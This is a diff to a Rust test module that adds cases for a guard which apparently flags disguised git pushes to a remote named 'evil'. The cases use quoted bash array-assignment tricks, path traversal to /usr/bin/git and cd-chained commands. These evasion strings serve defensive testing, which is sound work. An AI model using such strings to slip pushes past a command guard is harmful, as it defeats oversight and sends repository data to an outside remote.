@@ -3370,6 +3370,16 @@ mod tests {
                 ("A[0]=x git push evil main", true),
                 ("A[0]+=x git push evil main", true),
                 ("A[\"]\"]=x git push evil main", true),
+                // #1299 review C1: a word bash runs as the command, though
+                // its text reads as an assignment once quotes are gone.
+                ("\"d[0]=/git\" push evil main", true),
+                (
+                    "'d[0]=/../../../../../../../../usr/bin/git' push evil main",
+                    true,
+                ),
+                ("d[0]x]=/../../../usr/bin/git push evil main", true),
+                ("\"A[0]=x\" cd /tmp; git push evil main; cd -", true),
+                ("A[]]=x cd /tmp; git push evil main; cd -", true),
                 // #1295: for-each-repo runs the push in repositories no
                 // walk can name, whichever remote it names.
                 (
